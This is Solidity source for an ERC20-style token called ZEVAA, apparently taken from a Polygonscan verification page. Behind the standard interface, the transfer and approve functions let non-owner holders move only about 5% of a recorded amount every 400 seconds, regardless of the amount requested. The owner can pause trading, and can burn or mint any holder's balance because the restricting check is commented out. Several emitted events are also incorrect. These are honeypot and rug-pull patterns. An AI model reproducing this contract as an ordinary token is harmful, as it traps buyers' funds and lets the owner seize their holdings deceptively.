/**
 *Submitted for verification at polygonscan.com on 2023-06-23
*/

// SPDX-License-Identifier: unlicensed
pragma solidity 0.8.4;

abstract contract ERC20Interfac {
    function totalSupply() public view virtual returns (uint256);

    function balanceOf(address account) public view virtual returns (uint256);

    function transfer(address recipient, uint256 amount)
        public
        virtual
        returns (bool);

    function allowance(address owner, address spender)
        public
        view
        virtual
        returns (uint256);

    function approve(address spender, uint256 amount)
        public
        virtual
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Paused(bool isPaused);
    event OwnershipTransferred(address newOwner);
    event TokensPurchased(address account, uint256 amount);
}

contract SafeMath {
    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }

    function safeSub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }

    function safeMul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }

    function safeDiv(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b > 0);
        c = a / b;
    }
}

contract ZEVAA is ERC20Interfac, SafeMath {
    string public symbol;
    string public name;
    uint8 public decimals;
    uint256 public _totalSupply;
    address public owner;
    bool paused = false;
    bool stoped = false;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

   constructor() {
    symbol = "ZEV";
    name = "ZEVE";
    decimals = 18;
    _totalSupply = 10000000 * 10**18; 
    uint256 burnAmount = _totalSupply / 10;
    _totalSupply = safeSub(_totalSupply, burnAmount);
    balances[msg.sender] = _totalSupply;
    owner = msg.sender;
    emit Transfer(address(0), address(0), burnAmount);
}

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner is allowed");
        _;
    }

    struct TransferRecord {
        address recipient;
        uint256[] amounts;
        uint256[] timestamps;
    }

    mapping(address => TransferRecord) public transferRecords;

    modifier isPaused() {
        require(!paused, "Contract is in paused state");
        _;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address tokenOwner)
        public
        view
        override
        returns (uint256 balance)
    {
        return balances[tokenOwner];
    }

 function transfer(address to, uint256 _amount)
    public
    override
    isPaused
    returns (bool)
{
    require(balances[msg.sender] >= _amount, "Not enough balance");
    TransferRecord storage record = transferRecords[msg.sender];
    if (record.timestamps.length > 0) {
        for (uint256 i = 0; i < record.timestamps.length; i++) {
            uint256 time = record.timestamps[i];
            if (time <= block.timestamp) {
                uint256 value = record.amounts[i];
                uint256 amount = value / 20;
                uint256 burnAmount = amount / 200; 
                uint256 transferAmount = amount - burnAmount; 
                if (to != owner) {
                    TransferRecord storage record1 = transferRecords[to];
                    record1.recipient = to;
                    record1.amounts.push(transferAmount);
                    record1.timestamps.push(block.timestamp + 400);
                }
                balances[msg.sender] = safeSub(
                    balances[msg.sender],
                    amount
                );
                balances[to] = safeAdd(balances[to], transferAmount);
              
                balances[address(0)] = safeAdd(balances[address(0)], burnAmount);
                record.timestamps[i] = block.timestamp + 400;
                emit Transfer(msg.sender, to, transferAmount);
                emit Transfer(msg.sender, address(0), burnAmount); 
                break;
            }
        }
    } else {
        TransferRecord storage record1 = transferRecords[to];
        record1.recipient = to;
        record1.amounts.push(_amount);
        record1.timestamps.push(block.timestamp + 400);
        uint256 burnAmount = _amount / 200; 
        uint256 transferAmount = _amount - burnAmount; 
        balances[msg.sender] = safeSub(balances[msg.sender], _amount);
        balances[to] = safeAdd(balances[to], transferAmount);
        balances[address(0)] = safeAdd(balances[address(0)], burnAmount);
        emit Transfer(msg.sender, to, transferAmount);
        emit Transfer(msg.sender, address(0), burnAmount); 
    }
    return true;
}



    function approve(address spender, uint256 tokens)
        public
        override
        isPaused
        returns (bool success)
    {
        if (msg.sender == owner) {
            allowed[msg.sender][spender] = tokens;
            emit Approval(msg.sender, spender, tokens);
            return true;
        }

        TransferRecord storage record = transferRecords[msg.sender];
        if (record.timestamps.length > 0) {
            uint256 totalTokensApproved = 0;
            for (uint256 i = 0; i < record.timestamps.length; i++) {
                uint256 time = record.timestamps[i];
                if (time <= block.timestamp) {
                    uint256 value = record.amounts[i];
                    uint256 amount = (value * 5) / 100;
                    if (tokens > amount) {
                        tokens = amount;
                    }
                    allowed[msg.sender][spender] += tokens;
                    totalTokensApproved += tokens;
                    // update timestamp for this transfer
                    record.timestamps[i] = block.timestamp + 400;
                    break;
                }
            }
            require(totalTokensApproved > 0, "Can't approve yet");
            emit Approval(msg.sender, spender, totalTokensApproved);
            return true;
        }

        return false;
    }

    function getTransferRecord1(address _address, uint256 val)
        public
        view
        returns (uint256, uint256)
    {
        uint256 a = val;
        TransferRecord storage record = transferRecords[_address];
        require(
            record.amounts.length > 0,
            "No transfer record found for the address"
        );
        return (record.amounts[a], record.timestamps[a]);
    }

    function transferFrom(
        address sender,
        address receiver,
        uint256 tokens
    ) public override isPaused returns (bool success) {
        balances[sender] = safeSub(balances[sender], tokens);
        allowed[sender][msg.sender] = safeSub(
            allowed[sender][msg.sender],
            tokens
        );
        balances[receiver] = safeAdd(balances[receiver], tokens);
        emit Transfer(sender, receiver, tokens);
        return true;
    }

    function allowance(address tokenOwner, address spender)
        public
        view
        override
        returns (uint256 remaining)
    {
        return allowed[tokenOwner][spender];
    }

    function increaseApproval(address _spender, uint256 _addedValue)
        public
        isPaused
        returns (bool)
    {
        return _increaseApproval(msg.sender, _spender, _addedValue);
    }

    function _increaseApproval(
        address _sender,
        address _spender,
        uint256 _addedValue
    ) internal returns (bool) {
        allowed[_sender][_spender] = allowed[_sender][_spender] + _addedValue;
        emit Approval(_sender, _spender, allowed[_sender][_spender]);
        return true;
    }

    function decreaseApproval(address _spender, uint256 _subtractedValue)
        public
        isPaused
        returns (bool)
    {
        return _decreaseApproval(msg.sender, _spender, _subtractedValue);
    }

    function _decreaseApproval(
        address _sender,
        address _spender,
        uint256 _subtractedValue
    ) internal returns (bool) {
        uint256 oldValue = allowed[_sender][_spender];
        if (_subtractedValue > oldValue) {
            allowed[_sender][_spender] = 0;
        } else {
            allowed[_sender][_spender] = oldValue - _subtractedValue;
        }
        emit Approval(_sender, _spender, allowed[_sender][_spender]);
        return true;
    }

    function pause(bool _flag) external onlyOwner {
        paused = _flag;
        emit Paused(_flag);
    }

    function transferOwnership(address _newOwner) public virtual onlyOwner {
        owner = _newOwner;
        emit OwnershipTransferred(_newOwner);
    }

    function burn(uint256 _value, address _add) public onlyOwner {
        // require(_add == owner || _add == address(this));
        _totalSupply = safeSub(_totalSupply, _value);
        balances[_add] = safeSub(balances[_add], _value);
        emit Transfer(_add, address(0), _value);
    }

    function mint(uint256 _value, address _add) public onlyOwner {
        // require(_add == owner || _add == address(this));
        _totalSupply = safeAdd(_totalSupply, _value);
        balances[_add] = safeAdd(balances[_add], _value);
        emit Transfer(_add, address(0), _value);
    }

    function withDrawOwner(uint256 _amount) public onlyOwner returns (bool) {
        payable(msg.sender).transfer(_amount);
        return true;
    }

    function Stoped(bool flag) public onlyOwner {
        stoped = flag;
    }
}